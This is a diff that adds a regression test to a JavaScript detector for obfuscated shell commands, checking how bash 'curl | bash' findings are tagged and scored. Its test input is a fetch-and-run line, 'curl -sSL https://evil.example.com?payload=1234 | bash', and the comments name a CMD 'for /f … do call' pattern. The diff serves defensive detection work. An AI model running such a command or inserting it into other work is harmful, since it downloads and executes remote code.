@@ -23,12 +23,22 @@ const { loadModules, host } = require('../helpers/load-bundle.js');
 
 // bash-obfuscation.js attaches onto EncodedContentDetector.prototype
 // and reads `this.maxCandidatesPerType` / `this._bruteforce`.
+//
+// `entropy.js`, `ioc-extract.js`, and `cmd-obfuscation.js` are also
+// loaded so the post-processor regression test below can drive
+// `_processCommandObfuscation()` end-to-end (it pulls in
+// `_extractIOCsFromDecoded`, `_tryDecodeUTF8/16LE`, and
+// `_shannonEntropyBytes`).
 const ctx = loadModules([
   'src/constants.js',
   'src/encoded-content-detector.js',
+  'src/decoders/safelinks.js',
+  'src/decoders/entropy.js',
+  'src/decoders/ioc-extract.js',
+  'src/decoders/cmd-obfuscation.js',
   'src/decoders/bash-obfuscation.js',
 ]);
-const { EncodedContentDetector } = ctx;
+const { EncodedContentDetector, IOC } = ctx;
 const d = new EncodedContentDetector();
 
 /** Helper: collect every candidate matching `pred` and project across realms. */
@@ -288,4 +298,50 @@ test('bash-obfuscation: caps at maxCandidatesPerType', () => {
   const pipes = pick(cands, c => /Pipe-to-Shell/.test(c.technique));
   assert.ok(pipes.length <= d.maxCandidatesPerType,
     `expected ≤ ${d.maxCandidatesPerType} candidates, got ${pipes.length}`);
+});
+
+// ── Post-processor regression: CMD `for /f` pattern must not leak ───────────
+//
+// Background: `_executeOutput` started life as a CMD-specific marker
+// for `for /f … do call %X` (b74cd05). c3e94a1 broadened it to
+// "decoded payload is fed back into a shell" across bash / python /
+// php / js decoders. The post-processor in cmd-obfuscation.js
+// previously read `_executeOutput` and unconditionally pushed the
+// CMD-only IOC.PATTERN
+//   "for /f … do call %X — captured command output is executed as a
+//    shell command"
+// onto every family's findings. The regression: bash `curl … | bash`
+// findings showed the CMD `for /f` pattern in the sidebar.
+//
+// The fix splits severity escalation (still `_executeOutput`) from
+// the family-specific IOC.PATTERN text (now `_patternIocs`). These
+// tests pin the new contract.
+
+test('bash-obfuscation: post-processor does NOT attach CMD `for /f` pattern to live-fetch finding', async () => {
+  const text = 'curl -sSL https://evil.example.com?payload=1234 | bash';
+  const cands = d._findBashObfuscationCandidates(text, {});
+  const cand = cands.find(c => /Pipe-to-Shell.*live fetch/.test(c.technique));
+  assert.ok(cand, `expected B4 live-fetch candidate; got: ${JSON.stringify(host(cands))}`);
+  assert.equal(cand._executeOutput, true, 'pre-condition: candidate marks _executeOutput');
+  assert.equal(cand._patternIocs, undefined,
+    'bash live-fetch candidate must NOT carry _patternIocs (no per-family mirror in this PR)');
+
+  const finding = await d._processCommandObfuscation(cand);
+  assert.ok(finding, 'expected post-processor to produce a finding');
+
+  const patternIocs = (finding.iocs || []).filter(i => i.type === IOC.PATTERN);
+  const forFLeak = patternIocs.find(i => /for\s*\/f/i.test(i.url || ''));
+  assert.equal(forFLeak, undefined,
+    `bash candidate must not carry the CMD \`for /f\` pattern; got: ${JSON.stringify(host(patternIocs))}`);
+
+  // The URL IOC from the decoded payload survives into the finding.
+  const urlIoc = (finding.iocs || []).find(i => /evil\.example\.com/.test(i.url || ''));
+  assert.ok(urlIoc, `expected URL IOC preserved; got: ${JSON.stringify(host(finding.iocs))}`);
+
+  // Severity is bumped per `_executeOutput` semantics. A URL IOC plus
+  // the dangerousPatterns hits (`curl`, `bash`) already push past
+  // the default 'medium' tier; with `_executeOutput` it lands at
+  // 'high' or 'critical'.
+  assert.ok(finding.severity === 'high' || finding.severity === 'critical',
+    `expected severity ≥ high; got ${finding.severity}`);
 });
